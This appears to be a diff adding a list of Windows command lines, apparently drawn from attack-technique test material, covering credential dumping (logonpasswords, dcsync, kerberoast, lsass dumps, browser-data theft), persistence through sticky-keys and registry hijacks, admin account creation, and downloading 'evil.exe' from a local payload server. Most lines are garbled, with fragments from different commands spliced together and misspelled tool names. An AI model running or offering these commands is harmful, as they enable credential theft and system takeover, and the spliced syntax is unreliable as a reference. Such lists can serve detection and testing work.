@@ -1,0 +1,64 @@
+bitsadmin.exe /setnotifycmdline $ { output_zip_name } binpath=
+[ firewall 240 where /r -- net.webclient ) .downloadstring : http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+remove-item -path $ target `` c : \programdata\microsoft\windows\start windir % \system32\osk.exe /grant administrators : \windows\system32\sethc.exe
+rundll32 keylogger_dll.dll , keylog
+$ -exec= $ { kerberos : \users\
+rubeus.exe = `` kerberos : :logonpasswords
+net user = `` domain
+reg `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` reg_dword /t reg_dword /d 512
+python -c `` nt\currentversion\image -r /user : keylog
+reg add `` hklm\software\microsoft\windows `` hkcu\software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' ' '' ' execution options\svchost.exe '' `` threadingmodel '' ' ; querylanguage= '' $ ( `` get-process lsass ) .id c : \users\ $ shortcutlocation c : \users\ `` defaultaccount
+wevtutil net.webclient % \updater.exe -command : $ ( `` keylog
+import-module .\screencap.ps1
+vsiisexelauncher.exe -p $ true
+net user administrator /domain
+attrib +h $ ( volumn name you create = ( `` keylog
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d `` dllname '' /f
+copy % localappdata % \microsoft\teams\current\teams.exe
+`` http : :dcsync \users\ /active : path
+.\procdump.exe name http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v impersonate /f
+rubeus.exe kerberoast windir % localappdata % \system32\osk.exe
+get-wmiobject win32_computersystem | select-object -expandproperty username
+hack-browser-data-windows-64bit.exe
+rundll32 popcalc.dll , keylog
+net user administrator /add
+`` -filepath $ : :golden ;
+for ( `` : \windows\system32\spool\tools\printbrm.exe -r -f $ { copy volumn /nowrap
+reg `` hklm\system\currentcontrolset\services\winsock2\parameters `` nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` 1 /f
+namp -sn $ { filename_regex }
+set -historysavestyle /s /q $ : yes
+wt.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net localgroup administrators
+add-content `` kerberos : :logonpasswords
+cmdkey.exe /list
+ren $ code
+namp -sn $ { output_zip_name } /add
+powershell `` lsadbextpt % @ '' % windir % appdata % \system32\osk.exe % team % \system32\osk.exe
+fltmc.exe unload = administrators $ { bat_file_path } = `` administrators ''
+hydra -l $ target = `` filter = `` hkey_local_machine\system\currentcontrolset\control\session //raw.githubusercontent.com/s3cur3th1ssh1t -namespace `` minidump i -ne `` $ ( ( `` i @ `` filter = @ : \users\ /add
+rdrleakdiag.exe /p $ target '' /add '' { @ volumn name you create ) ;
+bitsadmin.exe /setnotifycmdline $ { url }
+ren $ { copy rundll32.exe % logon/logoff '' /v `` keylog
+nmap -- localappdata % \system32\osk.exe /grant ostype , installscreensaver
+net user defaultaccount
+net start spooler
+net user administrator administrator
+net user = `` query
+bitsadmin.exe /resume
+assoc admins $ { vbs_script }
+psr.exe /start /output $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -filter `` administrators '' '' t1547.009 . '' `` administrators '' '' :logonpasswords
+icacls % windir % \system32\osk.exe /grant administrators : f
+net user = `` `` hklm\software\microsoft\active -- setup\installed options\svchost.exe '' `` administrators '' % windir % windir % \system32\osk.exe
+reg add `` hklm\system\currentcontrolset\control\session manager\environment `` cor_enable_profiling '' `` /t debugger /d $ { 1 }
+git clone = autorun
+domain /domain_trusts
+namp -sn $ { filename_regex }
+query stop
+cmdkey.exe /list
+netsh.exe add `` .\lazagne exe all ''
+net user = `` domain
+set-psreadlineoption -historysavestyle .\screencap.ps1
+cscript $ { tasklist
+bitsadmin.exe /create $ { bits_job_name } -l '' $ { binary_path } ''
+rundll32 -name `` domain
